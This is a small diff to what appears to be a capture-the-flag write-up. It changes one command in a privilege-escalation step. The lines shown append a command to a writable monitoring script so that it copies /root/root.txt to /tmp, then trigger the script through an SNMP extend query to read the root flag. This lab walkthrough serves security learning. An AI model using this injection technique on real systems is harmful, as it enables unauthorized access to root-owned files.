@@ -165,7 +165,7 @@ We have found a way to run check_temp.sh so let's use it to grab the root flag!
 
     [monitor@simple ~]$ echo "cp /root/root.txt /tmp/flag" >> /usr/local/bin/monitoring/check_temp.sh
 
-    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"' ; cat /tmp/flag
+    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"' && cat /tmp/flag
     NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp" = STRING: 37.5
     ******************
 
